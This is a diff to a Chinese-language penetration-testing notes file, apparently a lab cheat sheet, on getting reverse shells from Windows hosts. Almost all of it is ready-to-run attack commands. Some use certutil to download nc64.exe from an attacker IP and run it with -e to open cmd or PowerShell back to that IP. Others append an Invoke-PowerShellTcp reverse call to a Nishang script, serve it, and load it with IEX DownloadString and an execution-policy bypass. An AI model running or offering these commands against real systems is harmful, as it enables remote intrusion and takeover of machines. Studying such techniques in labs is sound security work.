@@ -80,7 +80,38 @@ START /B \\10.10.16.155\Enil\nc64.exe 10.10.16.155 443 -e cmd.exe
 启动后台运行，使用共享文件夹的 nc 绑定回连端口的 cmd。
 
 ```bash
-certutil.exe -urlcache -split -f http://10.10.16.58/nc64.exe C:\Programdata\nc64.exe C:\Programdata\nc64.exe 10.10.16.58 443 -e powershell.exe
+certutil.exe -urlcache -split -f http://10.10.16.58/nc64.exe C:\Programdata\nc64.exe
+```
+
+```bash
+C:\Programdata\nc64.exe 10.10.16.58 443 -e powershell.exe
 ```
 
 从 Kali 中下载 nc64.exe 到 Programdata 下，再使用 nc64 回连至 Kali。
+
+- Nishang
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ ls -liah Invoke-PowerShellTcp.ps1 
+2782262 -rw-r--r-- 1 kali kali 4.3K Mar 16 09:39 Invoke-PowerShellTcp.ps1
+                                                                                                        
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.58 -Port 443" >> Invoke-PowerShellTcp.ps1 
+                                                                                                        
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ tail -n 1 Invoke-PowerShellTcp.ps1 
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.58 -Port 443
+```
+
+```kali
+goshs -p 80
+```
+
+```windows
+IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.58/Invoke-PowershellTcp.ps1')
+```
+
+```bash
+powershell -ep bypass C:\Utils\rev.ps1
+```
